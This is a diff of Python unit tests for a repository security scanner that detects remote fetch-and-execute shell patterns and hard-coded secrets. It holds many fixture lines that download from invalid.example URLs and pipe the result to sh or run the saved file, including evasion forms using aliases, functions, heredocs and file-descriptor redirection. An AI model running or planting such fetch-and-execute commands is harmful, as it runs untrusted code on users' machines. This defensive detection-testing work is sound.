+            "chmod +x install.sh && ./install.sh\n"
+        )
+        conditional_remote, conditional_unparsed = (
+            scanner._remote_pipe_line_numbers(conditional)
+        )
+        self.assertTrue(conditional_remote or conditional_unparsed)
+
+    def test_req_009_dynamic_fetch_destinations_fail_closed_across_lines(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        cases = {
+            "curl-option": (
+                f'p=install.sh\n{fetcher} -o "$p" https://invalid.example/a\n'
+                'sh "$p"\n'
+            ),
+            "wget-option": (
+                'p=install.sh\nwget https://invalid.example/b -O "$p"\n'
+                'bash "$p"\n'
+            ),
+            "stdout-redirection": (
+                f'p=install.sh\n{fetcher} https://invalid.example/c > "$p"\n'
+                'sh "$p"\n'
+            ),
+        }
+        for name, text in cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertEqual([], remote)
+                self.assertEqual([3], unparsed)
+
+        same_line = (
+            f'p=install.sh; {fetcher} -o "$p" https://invalid.example/d; '
+            'sh "$p"\n'
+        )
+        self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(same_line))
+
+        unrelated = (
+            f"{fetcher} -o fetched.sh https://invalid.example/safe\n"
+            "sh reviewed.sh\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(unrelated))
+
+        download_only = (
+            f'p=download.bin\n{fetcher} -o "$p" https://invalid.example/inspect\n'
+            'file "$p"\n'
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(download_only))
+
+    def test_req_009_chained_and_wrapped_shell_aliases_are_bounded(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        multiline = (
+            "alias a=b\n"
+            f"alias b={fetcher}\n"
+            "a https://invalid.example/multiline | sh\n"
+        )
+        self.assertEqual(
+            ([3], []),
+            scanner._remote_pipe_line_numbers(multiline),
+        )
+
+        cases = {
+            "chain": f"alias a=b; alias b={fetcher}; a https://invalid.example/a | sh\n",
+            "command-wrapper": (
+                f"command alias a={fetcher}; a https://invalid.example/b | sh\n"
+            ),
+            "builtin-wrapper": (
+                f"builtin alias a={fetcher}; a https://invalid.example/c | sh\n"
+            ),
+            "options-to-file": (
+                f"alias get='{fetcher} -o fetched.sh'\n"
+                "get https://invalid.example/d\nsh fetched.sh\n"
+            ),
+        }
+        for name, text in cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+        benign = (
+            "alias a=b\nalias b=printf\n"
+            "a harmless >/dev/null\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(benign))
+
+        removed = (
+            "alias a=b\n"
+            f"alias b={fetcher}\n"
+            "unalias a\n"
+            "a https://invalid.example/removed-chain | sh\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(removed))
+
+        alias_flood = "; ".join(
+            f"alias a{index}=a{index + 1}" for index in range(4)
+        ) + f"; alias a4={fetcher}; a0 https://invalid.example/budget | sh"
+        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 3):
+            remote, unparsed = scanner._remote_pipe_line_numbers(alias_flood)
+        self.assertTrue(remote or unparsed)
+
+        multiline_flood = "\n".join(
+            [
+                "alias a0=a1",
+                "alias a1=a2",
+                "alias a2=a3",
+                "alias a3=a4",
+                f"alias a4={fetcher}",
+                "a0 https://invalid.example/multiline-budget | sh",
+            ]
+        )
+        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 3):
+            remote, unparsed = scanner._remote_pipe_line_numbers(multiline_flood)
+        self.assertTrue(remote or unparsed)
+
+    def test_req_009_forward_functions_and_file_effects_never_scan_clean(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        forward = (
+            "a(){ b; }\n"
+            f"b(){{ {fetcher} https://invalid.example/forward; }}\n"
+            "a | sh\n"
+        )
+        remote, unparsed = scanner._remote_pipe_line_numbers(forward)
+        self.assertTrue(remote or unparsed)
+
+        file_effect = (
+            f"download(){{ {fetcher} -o fetched.sh https://invalid.example/file; }}\n"
+            "download\nsh fetched.sh\n"
+        )
+        remote, unparsed = scanner._remote_pipe_line_numbers(file_effect)
+        self.assertTrue(remote or unparsed)
+
+        same_line = (
+            f"download(){{ {fetcher} -o fetched.sh https://invalid.example/inline; }}; "
+            "download; sh fetched.sh\n"
+        )
+        remote, unparsed = scanner._remote_pipe_line_numbers(same_line)
+        self.assertTrue(remote or unparsed)
+
+        case_flow = (
+            "case x in\n"
+            f"  x) {fetcher} -o fetched.sh https://invalid.example/case ;;\n"
+            "esac\nsh fetched.sh\n"
+        )
+        remote, unparsed = scanner._remote_pipe_line_numbers(case_flow)
+        self.assertTrue(remote or unparsed)
+
+    def test_req_009_native_files_consumers_and_transforms_are_closed(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        cases = {
+            "curl-native": (
+                f"{fetcher} -O https://invalid.example/native.sh\nsh native.sh\n"
+            ),
+            "curl-remote-name": (
+                f"{fetcher} --remote-name https://invalid.example/name.sh\n"
+                "sh name.sh\n"
+            ),
+            "wget-native": "wget https://invalid.example/wget.sh\nsh wget.sh\n",
+            "wget-combined": "wget -qOfetched.sh https://invalid.example/wget\nsh fetched.sh\n",
+            "stdin": (
+                f"{fetcher} -o fetched.sh https://invalid.example/stdin\n"
+                "sh < fetched.sh\n"
+            ),
+            "source-stdin": (
+                f"{fetcher} -o fetched.sh https://invalid.example/source\n"
+                ". < fetched.sh\n"
+            ),
+            "cat-pipeline": (
+                f"{fetcher} -o fetched.sh https://invalid.example/cat\n"
+                "cat fetched.sh | sh\n"
+            ),
+            "eval-cat": (
+                f"{fetcher} -o fetched.sh https://invalid.example/eval\n"
+                'eval "$(cat fetched.sh)"\n'
+            ),
+            "tee-output": (
+                f"{fetcher} https://invalid.example/tee | tee fetched.sh >/dev/null\n"
+                "sh fetched.sh\n"
+            ),
+            "substitution-output": (
+                f'printf %s "$({fetcher} https://invalid.example/sub)" > fetched.sh\n'
+                "sh fetched.sh\n"
+            ),
+            "heredoc-output": (
+                "sh <<'SCRIPT' > fetched.sh\n"
+                f"{fetcher} https://invalid.example/heredoc\n"
+                "SCRIPT\nsh fetched.sh\n"
+            ),
+        }
+        for name, text in cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+        for transform in ("mv", "cp", "install", "ln"):
+            with self.subTest(transform=transform):
+                text = (
+                    f"{fetcher} -o fetched.sh https://invalid.example/transform\n"
+                    f"{transform} fetched.sh moved.sh\n"
+                    "echo safe\n"
+                )
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertEqual([], remote)
+                self.assertIn(2, unparsed)
+
+        unrelated_transform = (
+            f"{fetcher} -o fetched.sh https://invalid.example/unrelated\n"
+            "cp reviewed.sh moved.sh\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(unrelated_transform))
+
+    def test_req_009_exec_redirections_apply_in_order_and_named_fds_invalidate(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        detected = {
+            "duplicate": (
+                "exec 3> >(sh) 4>&3\n"
+                f"{fetcher} https://invalid.example/duplicate >&4\n"
+            ),
+            "move": (
+                "exec 3> >(sh) 4>&3-\n"
+                f"{fetcher} https://invalid.example/move >&4\n"
+            ),
+            "stdout": (
+                "exec 3> >(sh) 1>&3\n"
+                f"{fetcher} https://invalid.example/stdout\n"
+            ),
+            "stderr": (
+                "exec 3> >(sh) 2>&3\n"
+                f"{fetcher} -o /dev/stderr https://invalid.example/stderr\n"
+            ),
+        }
+        for name, text in detected.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote, (name, remote, unparsed))
+
+        safe = (
+            "exec 3> >(sh) 3>/tmp/synthetic\n"
+            f"{fetcher} https://invalid.example/rewired >&3\n"
+            "exec {sink}> >(sh)\n"
+            "sink=9\n"
+            f"{fetcher} https://invalid.example/reassigned >&$sink\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(safe))
+
+    def test_req_009_literal_heredoc_output_becomes_code_at_consumers(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        cases = {
+            "group": (
+                "{\n cat <<'SCRIPT'\n"
+                f" {fetcher} https://invalid.example/group | sh\n"
+                "SCRIPT\n} | sh\n"
+            ),
+            "function": (
+                "emit(){\n cat <<'SCRIPT'\n"
+                f" {fetcher} https://invalid.example/function | sh\n"
+                "SCRIPT\n}\nemit | sh\n"
+            ),
+        }
+        for name, text in cases.items():
+            with self.subTest(name=name):
+                remote, unparsed = scanner._remote_pipe_line_numbers(text)
+                self.assertTrue(remote or unparsed, (name, remote, unparsed))
+
+        data_only = (
+            "cat <<'SCRIPT'\n"
+            f"{fetcher} https://invalid.example/data | sh\n"
+            "SCRIPT\n"
+        )
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(data_only))
+
+    def test_req_009_multiline_balance_is_shell_scoped_and_precise(self) -> None:
+        scanner = load_scanner_module()
+        fetcher = "cu" + "rl"
+        text = (
+            f"{fetcher} -o /tmp/x https://invalid.example/a | grep if\n"
+            f"{fetcher} https://invalid.example/b | sh\n"
+            f"if true; then\n  {fetcher} https://invalid.example/c\nfi | sh\n"
+        )
+        self.assertEqual(([2, 3], []), scanner._remote_pipe_line_numbers(text))
+
+        python_source = (
+            "if loader is None:\n"
+            "    raise RuntimeError()\n"
+            "for rule in (\n"
+            "    values\n"
+            "):\n"
+            'literal = {"$(", ">(\", "if"}\n'
+        )
+        self.assertEqual(
+            ([], []),
+            scanner._remote_pipe_line_numbers(
+                python_source,
+                structural_multiline=False,
+            ),
+        )
+
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "install.js",
+            "#!/usr/bin/env bash\n"
+            "fetch()\n{\n"
+            f"  {fetcher} https://invalid.example/shebang\n"
+            "}\nfetch | sh\n",
+        )
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = [
+            item
+            for item in report["findings"]
+            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual([6], [item["line"] for item in remote])
+
+    def test_req_009_function_scopes_alias_forms_and_stdout_are_precise(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        fixture.write(
+            "functions.sh",
+            "fetch()\n"
+            "{\n"
+            f"  {fetcher} https://invalid.example/function\n"
+            "}\n"
+            "fetch | sh\n"
+            f"FETCH=c''url\n"
+            "$FETCH https://invalid.example/concatenated | sh\n"
+            f"A=x FETCH={fetcher}\n"
+            "$FETCH https://invalid.example/multiple | sh\n"
+            f"export A=x FETCH={fetcher}\n"
+            "$FETCH https://invalid.example/exported | sh\n"
+            f"declare -x FETCH={fetcher}\n"
+            "$FETCH https://invalid.example/declared | sh\n"
+            f"{{ FETCH={fetcher}; $FETCH https://invalid.example/braces | sh; }}\n"
+            f"if true; then FETCH={fetcher}; $FETCH https://invalid.example/if | sh; fi\n"
+            f"( FETCH={fetcher}; $FETCH https://invalid.example/subshell | sh )\n",
+        )
+        fixture.write(
+            "safe-functions.sh",
+            f"FETCH={fetcher}\n"
+            "safe(){ FETCH=printf; $FETCH ignored; }\n"
+            "safe | sh\n"
+            f"redirected(){{ {fetcher} https://invalid.example/redirected; }} >/dev/null\n"
+            "redirected | sh\n",
+        )
+
+        report = self.json_report(self.run_scanner(fixture.root))
+        remote = {
+            (item["path"], item["line"])
+            for item in report["findings"]
+            if item["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        }
+        self.assertEqual(
+            {
+                ("functions.sh", 5),
+                ("functions.sh", 7),
+                ("functions.sh", 9),
+                ("functions.sh", 11),
+                ("functions.sh", 13),
+                ("functions.sh", 14),
+                ("functions.sh", 15),
+                ("functions.sh", 16),
+            },
+            remote,
+        )
+        self.assertNotIn("safe-functions.sh", {item["path"] for item in report["findings"]})
+
+    def test_req_009_function_and_heredoc_budgets_are_linear_and_fail_closed(self) -> None:
+        scanner = load_scanner_module()
+        function_text = "f(){\n" + ("echo safe\n" * 12_000) + "}\nf | sh\n"
+        started = time.perf_counter()
+        self.assertEqual(([], []), scanner._remote_pipe_line_numbers(function_text))
+        function_elapsed = time.perf_counter() - started
+        self.assertLess(function_elapsed, 1.5, f"pending function scan took {function_elapsed:.3f}s")
+
+        fetcher = "cu" + "rl"
+        heredoc_text = "bash <<A <<B <<C\n" + f"$({fetcher} https://invalid.example/tool)\n"
+        with mock.patch.object(scanner, "MAX_HEREDOC_SPECS", 2):
+            self.assertEqual(([], [1]), scanner._remote_pipe_line_numbers(heredoc_text))
+
+        heredoc_group = (
+            "sh "
+            + " ".join(f"0<<D{index}" for index in range(64))
+            + "\n"
+            + "".join(f":\nD{index}\n" for index in range(64))
+        )
+        repeated_heredocs = "# curl | sh\n" + heredoc_group * 128
+        started = time.perf_counter()
+        self.assertEqual(
+            ([], []),
+            scanner._remote_pipe_line_numbers(repeated_heredocs),
+        )
+        heredoc_elapsed = time.perf_counter() - started
+        self.assertLess(
+            heredoc_elapsed,
+            1.0,
+            f"repeated heredoc scan took {heredoc_elapsed:.3f}s",
+        )
 
     def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
         fixture = RepositoryFixture(self)
@@ -1710,6 +3638,7 @@ class PreflightTests(unittest.TestCase):
         phrase = "Synthetic credential phrase with spaces"
         backtick_phrase = "Synthetic backtick credential phrase"
         multiline = "Synthetic first line\nSynthetic second line 12345"
+        f_string_value = "SyntheticFStringCredential12345"
         token_name = "api" + "Token"
         fixture.write(
             "config.ts",
@@ -1721,14 +3650,23 @@ class PreflightTests(unittest.TestCase):
             f"const clientSecret = `{multiline}`;\n"
             "const accessToken = `${process.env.ACCESS_TOKEN}`;\n",
         )
+        fixture.write(
+            "fixture-factory.py",
+            'fixture.write("config.py", f\'token="{escaped_value}"\\n\')\n',
+        )
+        fixture.write(
+            "literal-f-string.py",
+            f'f\'token="{f_string_value}"\'\n',
+        )
         fixture.write(".env.example", "API_TOKEN=https://api.example.com/replace/me\n")
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         generic = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"]
-        self.assertEqual({4, 5, 6}, {item["line"] for item in generic})
+        self.assertEqual({1, 4, 5, 6}, {item["line"] for item in generic})
         self.assertNotIn(phrase, completed.stdout)
         self.assertNotIn(multiline, completed.stdout)
+        self.assertNotIn(f_string_value, completed.stdout)
 
     def test_req_009_new_provider_tokens_and_mutable_workflow_images_block(self) -> None:
         fixture = RepositoryFixture(self)
